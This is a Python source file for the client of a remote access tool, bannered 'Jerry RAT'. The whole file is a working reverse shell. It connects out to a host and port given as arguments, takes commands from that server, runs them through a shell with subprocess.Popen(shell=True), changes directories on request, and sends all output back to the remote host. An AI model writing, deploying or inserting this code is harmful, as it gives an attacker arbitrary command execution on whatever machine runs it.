import socket
import subprocess
import os
import sys

def banner():
    print('                                               ')
    print('                                               ')
    print('   ___                       ______  ___ _____ ')
    print('  |_  |                      | ___ \/ _ |_   _|')
    print('    | | ___ _ __ _ __ _   _  | |_/ / /_\ \| |  ')
    print('    | |/ _ | \'__| \'__| | | | |    /|  _  || |')
    print('/\__/ |  __| |  | |  | |_| | | |\ \| | | || |  ')
    print('\____/ \___|_|  |_|   \__, | \_| \_\_| |_/\_/  ')
    print('                       __/ |                   ')
    print('                      |___/   by DFwJZ         ')
    print('                                               ')
    print('                                               ')

class Client:
    """
    Represents a client for remote command execution.
    """

    def __init__(self, host_ip: str, host_port: str):
        self.host_ip = host_ip
        self.host_port = host_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ACK = "ACK"

    def connect(self):
        """
        Connects to the server.
        """

        print(f'[+] Connecting to {self.host_ip}.')
        self.sock.connect((self.host_ip, self.host_port))
        print(f'[+] Connected to {self.host_ip}.') 

    def process_message(self, msg: str):
        """
        Processes the incoming message and sends the response to the server.
        """

        print(f'[+] Message received - {msg}')
        msg = msg.strip()
        if msg.split(" ")[0] == 'cd':
            print(f'length of msg = {len(msg)}')
            self.change_directory(msg)
        else:
            self.execute_command(msg)

    def change_directory(self, msg: str):
        """
        Changes the current directory.
        """

        try:
            directory = str(msg.split(' ')[1])
            directory = os.path.expanduser(directory) # do nothing if $HOME is unknown
            os.chdir(directory)
            cur_dir = os.getcwd()
            print(f'[+] Changed to {cur_dir}')
            self.outbound_to_server(cur_dir.encode())
            print(f'[+] Sent new directory path to server - {cur_dir}')
        except IndexError:
            print('[-] No directory specified.')
            self.outbound_to_server(b'Error: no directory specified')
        except FileNotFoundError:
            print('[-] Invalid directory. Try again.')
            self.outbound_to_server(b'Error: no directory found')

    def execute_command(self, msg: str):
        """
        Executes the command in the shell and sends the output to the server.
        """

        command = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = command.stdout.read() + command.stderr.read()
        if len(output) == 0: # Avoiding no cli stdout &stderr, eg. touch abc.file_extension
            print(f'output is: {output}')
            output = b'no actual return values'
        self.outbound_to_server(output)
        print(f'[+] Sent command output to server - {output.decode()}')

    def wait_for_ack(self) -> bool:
        """
        Waits for an ACK from the server.
        """

        print('[+] Awaiting ACK from server.....')
        ack = self.sock.recv(1024).decode()
        if ack != self.ACK:
            print("[-] An error occurred: no ACK received from the server")
            return False
        print('[+] ACK received from server.')
        return True
    
    def outbound_to_server(self, msg):
        msg_to_send = str(msg).encode()
        self.sock.send(msg_to_send)


    def run(self):
        """
        Main loop for receiving messages and processing them.
        """

        self.connect()

        try:
            while True:
                print('[+] Awaiting reponse.....')
                msg = self.sock.recv(1024).decode()

                if not msg or msg.lower() == 'exit':  # Client disconnected or server terminated the session
                    print("[-] Server has initiated termination of the current session.")
                    break

                self.process_message(msg)

                if not self.wait_for_ack():
                    break

        except KeyboardInterrupt:
            print("[+] Keyboard interrupt issued.")
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            self.sock.close()

if __name__ == '__main__':
    try:
        HOST_IP = sys.argv[1]
        HOST_PORT = int(sys.argv[2])
        banner()
        client = Client(HOST_IP, HOST_PORT)
        client.run()
    except IndexError:
        print('[-] Command line argument(s) missing. Please try again.')
    except Exception as e:
        print(f'{e}. Please try again.')